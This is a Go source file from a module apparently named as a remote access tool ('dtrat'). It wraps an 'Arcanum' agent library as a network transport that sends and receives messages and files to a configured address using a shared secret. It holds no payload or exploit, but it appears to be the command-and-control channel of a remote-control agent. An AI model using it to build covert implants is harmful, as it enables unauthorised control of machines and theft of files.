package transport

import (
	"dtrat/config"

	arcanum "github.com/deuterium34/XdX-Arcanum"
)

type ArcanumTransport struct {
	agent arcanum.Arcanum
}

func NewArcanumTransport(cfg config.Config) (Transport, error) {
	agent, err := arcanum.NewArcanumAgent(
		cfg.Transport.Arcanum.Addr,
		cfg.General.AgentName,
		arcanum.GenerateKey(cfg.Transport.Arcanum.Secret),
	)

	if err != nil {
		return nil, err
	}

	return &ArcanumTransport{
		agent: agent,
	}, nil
}

func (a *ArcanumTransport) Send(s string, args ...any) error {
	return a.agent.Send(s, args...)
}

func (a *ArcanumTransport) SendFile(file string) error {
	return a.agent.SendFile(file)
}

func (a *ArcanumTransport) Wait() (message string, err error) {
	return a.agent.Wait()
}

func (a *ArcanumTransport) WaitFile() (path string, err error) {
	return a.agent.WaitFile()
}

func (a *ArcanumTransport) Start() error {
	return a.agent.Start()
}

func (a *ArcanumTransport) Close() error {
	return a.agent.Close()
}
